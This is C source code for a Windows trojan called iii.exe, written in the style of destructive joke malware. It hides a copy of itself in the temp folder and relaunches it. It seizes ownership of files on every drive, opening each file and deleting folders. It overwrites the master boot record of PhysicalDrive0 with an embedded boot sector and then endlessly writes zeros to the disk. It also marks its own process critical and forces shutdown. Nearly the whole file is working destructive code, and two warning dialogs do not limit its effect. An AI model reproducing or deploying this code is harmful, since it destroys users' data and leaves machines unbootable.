#include "iii.h"

const CHAR pccMbrData[512] = {
	0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E, 0xE0, 0x8E, 0xE8, 0x8E, 0xD0,
	0x66, 0xBC, 0x00, 0x7C, 0x00, 0x00, 0x66, 0x89, 0xE5, 0xEA, 0x1A, 0x7C,
	0x00, 0x00, 0x30, 0xE4, 0xB0, 0x13, 0xCD, 0x10, 0x0F, 0x31, 0xA3, 0xA2,
	0x7C, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0xBF, 0xFF, 0xF9, 0xB1, 0x20, 0xE8,
	0x3D, 0x00, 0xE8, 0x08, 0x00, 0xE8, 0x22, 0x00, 0xE8, 0x48, 0x00, 0xEB,
	0xFE, 0x88, 0xC8, 0x26, 0x88, 0x05, 0x4F, 0x83, 0xFF, 0xFF, 0x75, 0xF5,
	0xBF, 0xFF, 0xF9, 0x80, 0xF9, 0x33, 0x7F, 0x04, 0xFE, 0xC1, 0xEB, 0xE9,
	0xFE, 0xC5, 0xB1, 0x20, 0xEB, 0xE3, 0xB8, 0x40, 0x00, 0x8E, 0xC0, 0x26,
	0x8B, 0x1E, 0x6C, 0x00, 0x83, 0xC3, 0x37, 0x26, 0x39, 0x1E, 0x6C, 0x00,
	0x72, 0xF9, 0xC3, 0xB0, 0xB6, 0xE6, 0x43, 0xB8, 0xA9, 0x04, 0xE6, 0x42,
	0x88, 0xE0, 0xE6, 0x42, 0xE4, 0x61, 0x0C, 0x03, 0xE6, 0x61, 0xC3, 0xE4,
	0x61, 0x24, 0xFC, 0xE6, 0x61, 0xC3, 0x89, 0xD8, 0xC1, 0xE0, 0x07, 0x31,
	0xC3, 0x89, 0xD8, 0xC1, 0xE8, 0x09, 0x31, 0xC3, 0x89, 0xD8, 0xC1, 0xE0,
	0x08, 0x31, 0xC3, 0x89, 0xD8, 0xC3, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

BOOL
WINAPI
ExecuteDropper(VOID)
{
	WCHAR szPath[MAX_PATH] = { 0 };
	WCHAR szNewPath[MAX_PATH] = { 0 };
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi;
	DWORD dwUnnamed;
	HANDLE hFile;

	GetModuleFileNameW(NULL, szPath, MAX_PATH);
start:
	GetTempPathW(MAX_PATH, szNewPath);

	if (wcsncmp(szPath, szNewPath, wcslen(szNewPath)))
	{
		WCHAR szFileName[17] = { 0 };
		GetRandomPath(szFileName, 16);
		wcscat_s(szNewPath, MAX_PATH, szFileName);
		wcscat_s(szNewPath, MAX_PATH, L".txt");

		if ((hFile = CreateFileW(szNewPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL)) == INVALID_HANDLE_VALUE)
		{
			RtlZeroMemory(szNewPath, MAX_PATH);
			goto start;
		}

		while (!WriteFile(hFile, szPath, MAX_PATH, &dwUnnamed, NULL))
		{
			Sleep(10);
		}

		CloseHandle(hFile);

		GetTempPathW(MAX_PATH, szNewPath);
		wcscat_s(szNewPath, MAX_PATH, szFileName);
		wcscat_s(szNewPath, MAX_PATH, L".exe");

		while (!CopyFileW(szPath, szNewPath, FALSE))
		{
			Sleep(10);
		}

		while (!SetFileAttributesW(szNewPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM))
		{
			Sleep(10);
		}

		si.cb = sizeof(si);
		CreateProcessW(szNewPath, NULL, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &si, &pi);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);

		return FALSE;
	}
	else
	{
		*wcsrchr(szPath, L'.') = 0;
		wcscat_s(szPath, MAX_PATH, L".txt");

		while ((hFile = CreateFileW(szPath, GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL)) == INVALID_HANDLE_VALUE)
		{
			Sleep(10);
		}

		while (!ReadFile(hFile, szNewPath, MAX_PATH, &dwUnnamed, NULL))
		{
			Sleep(10);
		}

		CloseHandle(hFile);

		while (!DeleteFileW(szPath))
		{
			Sleep(10);
		}

		while (!DeleteFileW(szNewPath))
		{
			Sleep(10);
		}

		if (MessageBoxW(NULL, L"WARNING!\nYou are now running the iii.exe Trojan that can ERASE ALL YOUR DATA FOREVER.\n\nThis program was intended to be used for entertainment and educational purposes only.\nThe creators sixtyfour64 and UltraDasher965 are not responsible for any damage caused by iii.\n\nAre you sure you want to continue?", L"iii.exe - Potential danger launched.", MB_ICONWARNING | MB_YESNO | MB_SYSTEMMODAL | MB_DEFBUTTON2) != IDYES)
			return FALSE;
		if (MessageBoxW(NULL, L"FINAL WARNING!!!\nThis is actually dangerous and can and will CAUSE HARM.\n\nDo you wish to continue?\nWe aren't responsible for any damage.", L"iii.exe - FINAL CHANCE", MB_ICONWARNING | MB_YESNO | MB_SYSTEMMODAL | MB_DEFBUTTON2) != IDYES)
			return FALSE;
	}

	return TRUE;
}

BOOL
WINAPI
SetPrivilege(
	_In_ HANDLE hToken,
	_In_ PCWSTR szPrivilege,
	_In_ BOOL bEnablePrivilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValueW(NULL, szPrivilege, &luid))
	{
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		return FALSE;
	}

	return TRUE;
}

BOOL
WINAPI
TakeOwnership(
	_In_ PWSTR szFile
)
{
	BOOL bRetval = FALSE;
	HANDLE hToken = NULL;
	PSID pSIDAdmin = NULL, pSIDEveryone = NULL;
	PACL pACL = NULL;
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY, SIDAuthNT = SECURITY_NT_AUTHORITY;
	EXPLICIT_ACCESS ea[NUM_ACES] = { 0 };
	DWORD dwRes;

	if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone))
	{
		goto cleanup;
	}

	if (!AllocateAndInitializeSid(&SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSIDAdmin))
	{
		goto cleanup;
	}

	ea[0].grfAccessPermissions = GENERIC_ALL;
	ea[0].grfAccessMode = SET_ACCESS;
	ea[0].grfInheritance = NO_INHERITANCE;
	ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea[0].Trustee.ptstrName = (PWSTR)pSIDEveryone;

	ea[1].grfAccessPermissions = GENERIC_ALL;
	ea[1].grfAccessMode = SET_ACCESS;
	ea[1].grfInheritance = NO_INHERITANCE;
	ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[1].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
	ea[1].Trustee.ptstrName = (PWSTR)pSIDAdmin;

	if (SetEntriesInAclW(NUM_ACES, ea, NULL, &pACL) != ERROR_SUCCESS)
	{
		goto cleanup;
	}

	dwRes = SetNamedSecurityInfoW(szFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);

	if (dwRes == ERROR_SUCCESS)
	{
		bRetval = TRUE;
		goto cleanup;
	}

	if (dwRes != ERROR_ACCESS_DENIED)
	{
		goto cleanup;
	}

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		goto cleanup;
	}

	if (!SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, TRUE))
	{
		goto cleanup;
	}

	dwRes = SetNamedSecurityInfoW(szFile, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pSIDAdmin, NULL, NULL, NULL);

	if (dwRes != ERROR_SUCCESS)
	{
		goto cleanup;
	}

	if (!SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, FALSE))
	{
		goto cleanup;
	}

	dwRes = SetNamedSecurityInfoW(szFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);

	if (dwRes == ERROR_SUCCESS)
	{
		bRetval = TRUE;
	}

cleanup:
	if (pSIDAdmin) FreeSid(pSIDAdmin);
	if (pSIDEveryone) FreeSid(pSIDEveryone);
	if (pACL) LocalFree(pACL);
	if (hToken) CloseHandle(hToken);

	return bRetval;
}

VOID
WINAPI
DriveMess(VOID)
{
	WCHAR szTempDrives[512] = { 0 };
	DWORD dwLength = GetLogicalDriveStringsW(512, szTempDrives);

	CloseHandle(CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)FileMess, szTempDrives, 0, NULL));
	for (DWORD i = 0; i < dwLength; i++)
	{
		if (!szTempDrives[i])
		{
			CloseHandle(CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)FileMess, szTempDrives + (i + 1) * sizeof(WCHAR), 0, NULL));
		}
	}
}

BOOL
WINAPI
FileMess(
	_In_ PWSTR szDirectory
)
{
	TakeOwnership(szDirectory);

	WCHAR szSearchDir[MAX_PATH] = { 0 };
	lstrcpyW(szSearchDir, szDirectory);
	lstrcatW(szSearchDir, L"*.*");

	WIN32_FIND_DATA findData;
	HANDLE hSearch = FindFirstFileW(szSearchDir, &findData);

	if (hSearch == INVALID_HANDLE_VALUE)
		return FALSE;
	else do
	{
		if (!lstrcmpW(findData.cFileName, L".") || !lstrcmpW(findData.cFileName, L"..") ||
			findData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)
		{
			continue;
		}

		WCHAR szPath[MAX_PATH] = { 0 };
		lstrcpyW(szPath, szDirectory);
		lstrcatW(szPath, findData.cFileName);

		TakeOwnership(szPath);

		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			lstrcatW(szPath, L"\\");
			FileMess(szPath);
			RemoveDirectoryW(szPath);
		}
		else
		{
			ShellExecuteW(NULL, L"open", szPath, NULL, szDirectory, SW_SHOW);
		}
	}

	while (FindNextFileW(hSearch, &findData));

	FindClose(hSearch);
	RemoveDirectoryW(szDirectory);

	return TRUE;
}

BOOL
WINAPI
OverwriteBoot(VOID)
{
	HANDLE hDrive;
	DWORD dwWrittenBytes;
	BOOL bSuccess;

	hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (hDrive == INVALID_HANDLE_VALUE)
	{
		MessageBoxW(NULL, L"error: POTWOJEJ PYSZNEJ ZUPIE NIE RUSZAM DUPY Z KLOPA TA ZUPA BYLA Z MELKIEM NA MLEKOMAM NA ALERGIE", L"Best for making a BSoD video! - technologygamesandeas", MB_OK | MB_ICONERROR);
		return FALSE;
	}

	bSuccess = WriteFile(hDrive, pccMbrData, 32768, &dwWrittenBytes, NULL);

	if (!bSuccess)
	{
		MessageBoxW(NULL, L"error: POTWOJEJ PYSZNEJ ZUPIE NIE RUSZAM DUPY Z KLOPA TA ZUPA BYLA Z MELKIEM NA MLEKOMAM NA ALERGIE", L"gurt: sybau :sob:", MB_OK | MB_ICONERROR);
		CloseHandle(hDrive);

		return FALSE;
	}

	CHAR pcNullData[512];
	RtlZeroMemory(pcNullData, 512);

	for (;; WriteFile(hDrive, pcNullData, 512, &dwWrittenBytes, NULL));
}

BOOL
WINAPI
ForceShutdownComputer(VOID)
{
	NTSTATUS(NTAPI * RtlAdjustPrivilege)(ULONG ulPrivilege, BOOLEAN bEnable, BOOLEAN bCurrentThread, PBOOLEAN pbEnabled);
	NTSTATUS(NTAPI * NtShutdownSystem)(_In_ SHUTDOWN_ACTION Action);
	NTSTATUS(NTAPI * NtSetSystemPowerState)(_In_ POWER_ACTION SystemAction, _In_ SYSTEM_POWER_STATE MinSystemState, _In_ ULONG Flags);
	NTSTATUS ntReturnValue;
	HMODULE hNtDll;
	BOOLEAN bUnused;
	BOOL bSuccess;

	hNtDll = LoadLibraryW(L"ntdll.dll");
	RtlAdjustPrivilege = (PVOID)GetProcAddress(hNtDll, "RtlAdjustPrivilege");
	NtSetSystemPowerState = (PVOID)GetProcAddress(hNtDll, "NtSetSystemPowerState");
	NtShutdownSystem = (PVOID)GetProcAddress(hNtDll, "NtShutdownSystem");

	if (RtlAdjustPrivilege)
	{
		ntReturnValue = RtlAdjustPrivilege(19 /* SeShutdownPrivilege */, TRUE, FALSE, &bUnused);

		if (ntReturnValue)
		{
			MessageBoxW(NULL, L"Bro stop hacking, you ain't cool", L"EYE HAUGHCHOENOUGH", MB_OK | MB_ICONERROR);
			return FALSE;
		}
	}

	if (NtSetSystemPowerState)
	{
		ntReturnValue = NtSetSystemPowerState(PowerActionShutdownOff, PowerSystemShutdown,
			SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_POWER_SUPPLY);

		if (!ntReturnValue)
		{
			return TRUE;
		}
	}

	if (NtShutdownSystem)
	{
		ntReturnValue = NtShutdownSystem(ShutdownPowerOff);

		if (!ntReturnValue)
		{
			return TRUE;
		}
	}

	bSuccess = ExitWindowsEx(EWX_POWEROFF, EWX_FORCE);

	if (!bSuccess)
	{
		MessageBoxW(NULL, L"SEVERE JAW DROPPING ERROR: How about your Haste, Redsea, PolishMEMZ and NTFSFormatted?", L"HELLLO EVERYONE MY NAME IS MARKIPLIER - Ilikedragonball", MB_OK | MB_ICONERROR);

		return FALSE;
	}

	return TRUE;
}

BOOL
WINAPI
SetProcessCritical(VOID)
{
	NTSTATUS(NTAPI * RtlAdjustPrivilege)(ULONG ulPrivilege, BOOLEAN bEnable, BOOLEAN bCurrentThread, PBOOLEAN pbEnabled);
	NTSTATUS(NTAPI * RtlSetProcessIsCritical)(BOOLEAN bNew, PBOOLEAN pbOld, BOOLEAN bNeedScb);
	NTSTATUS ntReturnValue;
	ULONG ulBreakOnTermination;
	BOOLEAN bUnused;
	HMODULE hNtDll;

	hNtDll = LoadLibraryW(L"ntdll.dll");
	RtlAdjustPrivilege = (PVOID)GetProcAddress(hNtDll, "RtlAdjustPrivilege");
	RtlSetProcessIsCritical = (PVOID)GetProcAddress(hNtDll, "RtlSetProcessIsCritical");

	if (RtlAdjustPrivilege)
	{
		ntReturnValue = RtlAdjustPrivilege(20 /* SeDebugPrivilege */, TRUE, FALSE, &bUnused);

		if (ntReturnValue)
		{
			MessageBoxW(NULL, L"cheat", L"iii.exe", MB_OK | MB_ICONERROR);

			return FALSE;
		}
	}
	else
	{
		MessageBoxW(NULL, L"Nope", L"iii.exe", MB_OK | MB_ICONERROR);

		return FALSE;
	}

	if (RtlSetProcessIsCritical)
	{
		ulBreakOnTermination = 1;
		ntReturnValue = RtlSetProcessIsCritical(TRUE, NULL, FALSE);

		if (ntReturnValue)
		{
			MessageBoxW(NULL, L"get new VM ts pmo icl sybau", L"iii.exe", MB_OK | MB_ICONERROR);

			return FALSE;
		}
	}
	else
	{
		MessageBoxW(NULL, L"pwease. just get virtualbox...", L"iii.exe", MB_OK | MB_ICONERROR);

		return FALSE;
	}

	return TRUE;
}